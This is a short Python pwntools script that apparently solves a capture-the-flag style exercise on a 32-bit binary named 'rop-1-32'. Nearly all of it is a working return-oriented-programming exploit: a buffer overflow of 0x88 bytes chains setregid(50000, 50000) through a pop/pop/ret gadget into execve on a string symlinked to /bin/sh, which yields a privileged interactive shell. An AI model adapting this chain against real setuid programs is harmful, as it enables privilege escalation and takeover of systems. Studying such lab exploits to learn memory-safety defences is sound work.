from pwn import *

# This code requires a symbolic link from ink to /bin/sh to work

# Addresses needed for the attack
pop_pop_ret_addr = 0x0804865a # From ROPgadget --binary ./rop-1-32
setregid_addr = ELF('./rop-1-32').symbols['setregid']
execve_addr = ELF('./rop-1-32').symbols['execve']
sh_addr = 0x804873f # address of 'ink' in the program code

# Launch processs and send rop chain
p = process('./rop-1-32')
p.send('a' * 0x88 + 'bbbb' + p32(setregid_addr) + p32(pop_pop_ret_addr) + p32(50000) + p32(50000) + p32(execve_addr) + 'dddd' + p32(sh_addr) + p32(0) + p32(0))
#[0x88][ebp][ret1(setregid)][pop/pop/ret (call ret2)][ret1arg1][ret1arg2][ret2(execve)][garb][ret2arg1('ink')][ret2arg2][ret2arg3]

# Use privilleged shell to get the flag
p.interactive()
